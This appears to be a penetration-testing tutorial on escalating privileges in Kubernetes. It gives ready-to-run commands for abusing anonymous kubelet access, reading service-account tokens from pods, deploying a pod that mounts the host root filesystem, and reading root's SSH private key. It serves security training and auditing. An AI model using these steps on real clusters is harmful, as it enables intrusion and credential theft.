## Kubernetes (K8s) Privilege Escalation

Kubernetes is a container orchestration platform that runs applications in isolated containers across a cluster of nodes. Its architecture revolves around two components:

- **Control Plane** (master node) — manages the cluster
- **Worker Nodes** (minions) — run the containerized workloads

| | Docker | Kubernetes |
| --- | --- | --- |
| Primary use | Containerizing apps | Orchestrating containers |
| Scaling | Manual (Docker Swarm) | Automatic |
| Networking | Single network | Complex policies |
| Storage | Volumes | Wide range of options |

Key concepts: **Pods** are the smallest deployable unit (one or more containers); **Namespaces** are logical partitions for isolating resources.

---

### K8s API — anonymous access

If the Kubelet is configured to allow anonymous access, the API is reachable without credentials:

```shell
curl https://<IP>:6443 -k
```

`system:anonymous` indicates an unauthenticated session. Even with limited access, other endpoints may be reachable:

```shell
# Enumerate running pods — reveals names, namespaces, images, configs
curl https://<IP>:10250/pods -k | jq .
```

---

### Enumeration with kubeletctl

```shell
# List all pods
kubeletctl -i --server <IP> pods

# Scan for pods vulnerable to RCE
kubeletctl -i --server <IP> scan rce

# Execute commands inside a container
kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
```

---

### Privilege escalation — extract service account credentials

Every pod mounts a service account token and certificate by default. If we can exec into a container, we can extract them:

```shell
# Extract the service account token
kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p <pod> -c <container> | tee k8.token

# Extract the CA certificate
kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p <pod> -c <container> | tee ca.crt
```

Check what actions are permitted with the extracted token:

```shell
export token=$(cat k8.token)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
```

---

### Deploy a malicious pod — host filesystem mount

If the token has `create` permissions on pods, deploy a privileged pod that mounts the host root filesystem:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```shell
# Deploy
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml

# Confirm it's running
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 get pods
```

Once the pod is up, access the host filesystem through it:

```shell
kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

> 💡 The key permission to look for in `auth can-i --list` is `create pods` — that single permission is enough to mount the host filesystem and read any file on the node as root.
